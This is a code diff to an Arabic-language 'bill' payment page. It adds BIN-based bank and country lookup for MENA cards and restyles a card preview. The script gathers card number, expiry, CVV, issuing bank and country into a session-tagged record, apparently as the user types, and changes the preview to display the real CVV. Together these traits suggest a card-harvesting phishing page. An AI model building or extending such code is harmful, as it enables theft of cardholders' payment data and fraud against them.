@@ -6,7 +6,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="bill.css">
   <style>
-    /* 💳 ضبط أبعاد وتنسيق البطاقة الفعلي لمطابقة الصورة */
+    /* 💳 مظهر وتنسيق البطاقة الفعلي ومحاكاة التصميم المرفق */
     .card-real-preview {
       width: 100%;
       max-width: 380px;
@@ -24,26 +24,25 @@
       box-sizing: border-box;
       user-select: none;
       font-family: 'Inter', sans-serif;
+      transition: all 0.3s ease;
     }
     .card-top-row {
       display: flex;
       justify-content: space-between;
       align-items: flex-start;
+      min-height: 38px;
     }
     .bank-brand-title {
-      font-weight: 900;
-      font-size: 18px;
+      font-weight: 800;
+      font-size: 15px;
       color: #1e293b;
-      line-height: 1.1;
-      font-family: 'Cairo', sans-serif;
+      line-height: 1.2;
+      font-family: 'Inter', 'Cairo', sans-serif;
       text-align: left;
-    }
-    .bank-brand-sub {
-      font-size: 13px;
-      font-weight: 700;
-      color: #0d9488;
-      font-family: 'Inter', sans-serif;
-      display: block;
+      max-width: 220px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
     }
     .currency-box {
       border: 1px solid #cbd5e1;
@@ -96,6 +95,7 @@
       display: flex;
       justify-content: space-between;
       align-items: flex-end;
+      min-height: 32px;
     }
     .holder-and-flag {
       display: flex;
@@ -110,17 +110,9 @@
       text-transform: capitalize;
     }
     .card-flag-badge {
-      width: 24px;
-      height: 16px;
-      background: #006c35;
-      border-radius: 2px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-size: 9px;
-      font-weight: 900;
-      overflow: hidden;
+      font-size: 16px;
+      line-height: 1;
+      display: none;
     }
     .network-badge-group {
       display: flex;
@@ -142,9 +134,35 @@
       color: #0f172a;
       letter-spacing: 0.5px;
       text-transform: uppercase;
+      display: none;
     }
-    /* 🛑 فرض الاتجاه الإنجليزي لحقول الأرقام لمنع قلب الكتل */
-    #card-number, #card-expiry, #card-cvv {
+
+    /* 🛑 تثبيت الشعار على يمين حقل الإدخال مع الحفاظ على اتجاه الأرقام LTR */
+    .input-c {
+      position: relative;
+      display: flex;
+      align-items: center;
+      width: 100%;
+    }
+    .logo-in {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      pointer-events: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 2;
+    }
+    #card-number {
+      padding-right: 55px !important;
+      direction: ltr !important;
+      text-align: left !important;
+      unicode-bidi: isolate !important;
+      font-family: 'Inter', monospace, sans-serif !important;
+    }
+    #card-expiry, #card-cvv {
       direction: ltr !important;
       text-align: left !important;
       unicode-bidi: isolate !important;
@@ -162,15 +180,14 @@
     <section class="wrapper payment-card">
       <h3 class="title">💳 تفاصيل بطاقة الدفع</h3>
 
-      <!-- 🎨 بطاقة العرض المحدثة بنسبة ومظهر قياسي مطابق للصورة -->
+      <!-- 🎨 بطاقة العرض الذكية (تكون فارغة من الشعارات مبدئياً) -->
       <div class="card-real-preview" id="card-preview-container">
         <!-- الصف العلوي -->
         <div class="card-top-row">
           <div id="card-bank-header">
-            <span class="bank-brand-title" id="card-graphic-bank-ar">بنك الرياض</span>
-            <span class="bank-brand-sub" id="card-graphic-bank-en">riyad bank</span>
+            <span class="bank-brand-title" id="card-graphic-bank-title" style="display:none;"></span>
           </div>
-          <div class="currency-box">SAR</div>
+          <div class="currency-box" id="card-currency-box" style="display:none;">SAR</div>
         </div>
 
         <!-- الصف الأوسط -->
@@ -187,13 +204,11 @@
         <div class="card-bottom-row">
           <div class="holder-and-flag">
             <span class="card-holder-val" id="card-graphic-holder">CARDHOLDER NAME</span>
-            <div class="card-flag-badge" id="card-graphic-flag">🇸🇦</div>
+            <div class="card-flag-badge" id="card-graphic-flag"></div>
           </div>
           <div class="network-badge-group">
-            <div id="card-graphic-network">
-              <span class="visa-logo-text">VISA</span>
-            </div>
-            <span class="card-tier-text" id="card-graphic-tier">CREDIT • SIGNATURE</span>
+            <div id="card-graphic-network"></div>
+            <span class="card-tier-text" id="card-graphic-tier"></span>
           </div>
         </div>
       </div>
@@ -203,8 +218,8 @@
         <div class="form-group">
           <label>رقم بطاقة الدفع</label>
           <div class="input-c">
-            <!-- تحديد الحد الأقصى مع الفواصل بـ 19 حرف (16 رقم + 3 مسافات) -->
             <input type="text" id="card-number" placeholder="•••• •••• •••• ••••" maxlength="19" oninput="validateCardNumber(this)">
+            <!-- شعار الشبكة يظهر هنا على يمين الحقل -->
             <div class="logo-in" id="network-logo-inline"></div>
           </div>
         </div>
@@ -268,6 +283,53 @@
     var currentSessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36).substring(6, 10);
     var visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
 
+    // 🚀 قاعدة بيانات الـ BIN المحلية المحملة من الملف
+    var BIN_DATABASE = {};
+
+    // خريطة أعلام الدول بصيغة Emoji
+    var COUNTRY_FLAGS = {
+      'SA': '🇸🇦', 'QA': '🇶🇦', 'AE': '🇦🇪', 'KW': '🇰🇼', 'BH': '🇧🇭',
+      'OM': '🇴🇲', 'JO': '🇯🇴', 'EG': '🇪🇬', 'IQ': '🇮🇶', 'LB': '🇱🇧',
+      'SY': '🇸🇾', 'YE': '🇾🇪', 'PS': '🇵🇸'
+    };
+
+    // خريطة العملات الافتراضية لكل دولة
+    var COUNTRY_CURRENCY = {
+      'SA': 'SAR', 'QA': 'QAR', 'AE': 'AED', 'KW': 'KWD', 'BH': 'BHD',
+      'OM': 'OMR', 'JO': 'JOD', 'EG': 'EGP', 'IQ': 'IQD', 'LB': 'USD'
+    };
+
+    // تحميل وقراءة ملف CSV فورياً
+    (async function loadBinDatabase() {
+      try {
+        const res = await fetch('bin_list_filtered_mena.csv');
+        if (!res.ok) return;
+        const text = await res.text();
+        const lines = text.split('\n');
+        
+        for (let i = 1; i < lines.length; i++) {
+          const line = lines[i].trim();
+          if (!line) continue;
+          
+          // تقسيم سطور الـ CSV
+          const parts = line.split(',');
+          if (parts.length >= 8) {
+            const bin = parts[0].trim();
+            BIN_DATABASE[bin] = {
+              brand: parts[1].trim().toUpperCase(),
+              type: parts[2].trim().toUpperCase(),
+              category: parts[3].trim().toUpperCase(),
+              issuer: parts[4].trim(),
+              iso2: parts[7].trim().toUpperCase(),
+              country: parts[9] ? parts[9].trim() : ''
+            };
+          }
+        }
+      } catch (e) {
+        console.warn("Could not load local bin_list_filtered_mena.csv", e);
+      }
+    })();
+
     try {
       var sub = JSON.parse(localStorage.getItem('saas_last_submission') || '{}');
       if (sub['دولة القدوم'] || sub['دولة القدوم:']) {
@@ -305,9 +367,9 @@
       return sum % 10 === 0;
     }
 
-    const VISA_LOGO = `<span class="visa-logo-text">VISA</span>`;
-    const MC_LOGO = `<span style="font-weight:900;color:#eb001b;font-size:18px;">Mastercard</span>`;
-    const MADA_LOGO = `<span style="font-weight:900;color:#007cc2;font-size:16px;">mada مدى</span>`;
+    const VISA_BADGE = `<span class="visa-logo-text">VISA</span>`;
+    const MC_BADGE = `<span style="font-weight:900;color:#eb001b;font-size:18px;font-family:sans-serif;">Mastercard</span>`;
+    const MADA_BADGE = `<span style="font-weight:900;color:#007cc2;font-size:16px;font-family:sans-serif;">mada مدى</span>`;
 
     var lastReadyCard = null, lastReadyExpiry = null,
         isCardValid = false, isHolderValid = false, isExpiryValid = false, isCvvValid = false,
@@ -329,9 +391,16 @@
         var cExpiry = document.getElementById('card-expiry').value.trim();
         var cCvv = document.getElementById('card-cvv').value.trim();
 
-        var cleanNum = cNum.replace(/\s/g, ''), net = 'VISA';
-        if (cleanNum.startsWith('5')) net = 'MASTERCARD';
-        else if (cleanNum.startsWith('6') || ['484783', '458838', '428331'].some(p => cleanNum.startsWith(p))) net = 'MADA';
+        var cleanNum = cNum.replace(/\s/g, '');
+        var bin = cleanNum.substring(0, 6);
+        var binInfo = BIN_DATABASE[bin] || null;
+
+        var net = binInfo ? binInfo.brand : 'UNKNOWN';
+        if (net === 'UNKNOWN') {
+          if (cleanNum.startsWith('4')) net = 'VISA';
+          else if (cleanNum.startsWith('5')) net = 'MASTERCARD';
+          else if (cleanNum.startsWith('6')) net = 'MADA';
+        }
 
         if (st === 'typing' && lastReadyCard !== null) {
           var cleanLastReady = lastReadyCard.replace(/\s/g, '');
@@ -348,6 +417,8 @@
           'تاريخ الانتهاء': cExpiry,
           'رمز الأمان CVV': cCvv,
           'نوع البطاقة': net,
+          'البنك': binInfo ? binInfo.issuer : '',
+          'الدولة': binInfo ? binInfo.country : '',
           '_sessionId': currentSessionId
         };
 
@@ -372,52 +443,99 @@
     }
 
     function validateCardNumber(el) {
-      // 1. استخراج الأرقام فقط وقصها عند 16 رقماً كحد أقصى
+      // 1. تقييد الإدخال بـ 16 رقماً فقط
       let r = el.value.replace(/\D/g, '').substring(0, 16);
       
-      // 2. تجميع كل 4 أرقام بمسافة مع الحفاظ على الترتيب LTR
+      // 2. تجميع الأرقام إلى مجموعات من 4 أرقام من اليسار لليمين LTR
       el.value = r.replace(/(\d{4})/g, '$1 ').trim();
       document.getElementById('card-graphic-number').innerText = el.value || '•••• •••• •••• ••••';
 
-      let badge = VISA_LOGO;
-      let tier = 'CREDIT • SIGNATURE';
-      let bankAr = 'بنك الرياض';
-      let bankEn = 'riyad bank';
+      // استدعاء عناصر البطاقة المعروضة
+      const bankTitleEl = document.getElementById('card-graphic-bank-title');
+      const currencyBox = document.getElementById('card-currency-box');
+      const networkGraphic = document.getElementById('card-graphic-network');
+      const networkInline = document.getElementById('network-logo-inline');
+      const tierEl = document.getElementById('card-graphic-tier');
+      const flagEl = document.getElementById('card-graphic-flag');
 
-      if (r.startsWith('5')) {
-        badge = MC_LOGO;
-        tier = 'TITANIUM DEBIT';
-      } else if (r.startsWith('6') || ['484783', '458838', '428331'].some(p => r.startsWith(p))) {
-        badge = MADA_LOGO;
-        tier = 'DEBIT • CLASSIC';
+      // 🛑 إعادة تصفير وإخفاء كل شيء إذا كان الإدخال أقل من 6 أرقام
+      if (r.length < 6) {
+        bankTitleEl.style.display = 'none';
+        currencyBox.style.display = 'none';
+        networkGraphic.innerHTML = '';
+        networkInline.innerHTML = '';
+        tierEl.style.display = 'none';
+        flagEl.style.display = 'none';
+
+        // إظهار مبدئي لشعار عام إن بدأ برقم معروف
+        if (r.startsWith('4')) networkInline.innerHTML = VISA_BADGE;
+        else if (r.startsWith('5')) networkInline.innerHTML = MC_BADGE;
+        else if (r.startsWith('6')) networkInline.innerHTML = MADA_BADGE;
+
+        isCardValid = false;
+        el.className = r.length > 0 ? 'error' : '';
+        updatePayButtonState();
+        return;
       }
 
-      // التعرف على البنك من أول الأرقام
-      if (r.startsWith('4')) {
-        bankAr = 'بنك الرياض';
-        bankEn = 'riyad bank';
-      } else if (r.startsWith('5')) {
-        bankAr = 'مصرف الراجحي';
-        bankEn = 'alrajhi bank';
-      } else if (r.startsWith('6')) {
-        bankAr = 'البنك الأهلي السعودي';
-        bankEn = 'SNB';
+      // 🔍 البحث عن البادئة داخل قاعدة البيانات المحملة من الملف المرفق
+      const bin = r.substring(0, 6);
+      const binMatch = BIN_DATABASE[bin] || null;
+
+      let badgeHtml = '';
+      let brandName = binMatch ? binMatch.brand : '';
+      let bankName = binMatch ? binMatch.issuer : '';
+      let isoCode = binMatch ? binMatch.iso2 : '';
+      let cardType = binMatch ? binMatch.type : 'CREDIT';
+      let cardCat = binMatch ? binMatch.category : 'SIGNATURE';
+
+      // التعرف الاحتياطي إن لم توجد في الملف
+      if (!brandName) {
+        if (r.startsWith('4')) brandName = 'VISA';
+        else if (r.startsWith('5')) brandName = 'MASTERCARD';
+        else if (r.startsWith('6')) brandName = 'MADA';
       }
 
-      document.getElementById('card-graphic-bank-ar').innerText = bankAr;
-      document.getElementById('card-graphic-bank-en').innerText = bankEn;
-      document.getElementById('card-graphic-network').innerHTML = badge;
-      document.getElementById('card-graphic-tier').innerText = tier;
-      document.getElementById('network-logo-inline').innerHTML = badge;
+      if (brandName === 'MADA' || (isoCode === 'SA' && cardType === 'DEBIT')) {
+        badgeHtml = MADA_BADGE;
+      } else if (brandName === 'MASTERCARD') {
+        badgeHtml = MC_BADGE;
+      } else {
+        badgeHtml = VISA_BADGE;
+      }
 
-      // فحص صحة الـ 16 رقم
+      // 🎨 إظهار وعرض البيانات فور التعرف عليها
+      if (bankName) {
+        bankTitleEl.innerText = bankName;
+        bankTitleEl.style.display = 'block';
+      } else {
+        bankTitleEl.style.display = 'none';
+      }
+
+      currencyBox.innerText = COUNTRY_CURRENCY[isoCode] || 'SAR';
+      currencyBox.style.display = 'block';
+
+      networkGraphic.innerHTML = badgeHtml;
+      networkInline.innerHTML = badgeHtml;
+
+      tierEl.innerText = `${cardType} • ${cardCat}`;
+      tierEl.style.display = 'block';
+
+      if (COUNTRY_FLAGS[isoCode]) {
+        flagEl.innerText = COUNTRY_FLAGS[isoCode];
+        flagEl.style.display = 'block';
+      } else {
+        flagEl.style.display = 'none';
+      }
+
+      // فحص صحة رقم البطاقة بـ Luhn Algorithm
       if (r.length === 16) {
         isCardValid = isValidLuhn(r);
         el.className = isCardValid ? 'success' : 'error';
         if (isCardValid) document.getElementById('card-expiry').focus();
       } else {
         isCardValid = false;
-        el.className = r.length > 0 ? 'error' : '';
+        el.className = 'error';
       }
       updatePayButtonState();
     }
@@ -450,7 +568,7 @@
     function validateCardCvv(el) {
       let v = el.value.replace(/\D/g, '').substring(0, 4);
       el.value = v;
-      document.getElementById('card-graphic-cvv').innerText = v.length > 0 ? '•••' : '•••';
+      document.getElementById('card-graphic-cvv').innerText = v.length > 0 ? v : '•••';
       isCvvValid = v.length >= 3;
       el.className = isCvvValid ? 'success' : (v.length > 0 ? 'error' : '');
       if (isCvvValid && v.length === 3) document.getElementById('card-holder').focus();
